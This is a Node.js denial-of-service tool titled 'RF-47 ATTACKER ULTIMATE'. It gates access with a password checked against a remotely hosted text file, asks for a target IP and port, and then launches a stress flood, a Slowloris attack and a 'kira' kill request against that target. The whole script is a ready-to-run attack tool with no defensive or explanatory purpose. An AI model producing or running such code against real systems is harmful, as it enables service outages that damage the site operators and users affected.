const os = require("os");
const Stress = require("ddos-stress");
const request = require("request");
const Loris = require("@anzerr/slowloris.tool");
const stress = new Stress ();

var setTitle = require('console-title');
setTitle('RF-47 ATTACKER ULTIMATE');
const prompt = require("prompt-sync")();
console.log("RF-47 ATTACKER ULTIMATE")
const pass = prompt(`RF-47 ULTIMATE Accses ( Password )> `.red)
request('https://investasean.asean.org/files/file/4.txt', function (error, response, body) {
  if (body === pass) {
  }
  else {
    console.log(`Wrong Password !!`.red)
    process.exit();
  }
});
var IP = prompt(`Input IP > `.red);
var PORT = prompt(`Input Port > `.red);
var Kira = require('kira');
var api = new Kira();

stress.run(""+ IP +":"+ PORT +"", 5000)
let l = new Loris("http://"+ IP +":"+ PORT +"", 300000).attack();
api.kill('http://'+ IP +'', 200, 10000, 'https://'+ IP +':'+ PORT +'');

return new Promise((resolve) => l.once("end", resolve))
  .then(() => {
    console.log("attack ended");
  })
  .catch(console.log);


